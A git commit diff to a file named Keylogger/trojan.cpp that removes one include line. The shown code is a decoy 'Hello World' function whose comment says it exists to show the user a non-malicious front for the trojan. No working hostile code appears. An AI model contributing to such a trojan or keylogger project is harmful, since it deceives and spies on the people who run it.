f172c2172e8eae304673b6718f5665d1ba96076b
Sharkbyteprojects <40953479+Sharkbyteprojects@users.noreply.github.com>
2022-03-02 16:01:33 +0100

    Update trojan.cpp

--- Keylogger/trojan.cpp
+++ Keylogger/trojan.cpp
@@ -1,6 +1,5 @@
 #include "trojan.h"
 #include <iostream>
-#include <filesystem>
 
 int om(int argc, char* argv[]){//Main function of the Trojan Horse (do this to show the user an not malicius function)
 	std::cout << "Hello World!" << std::endl;
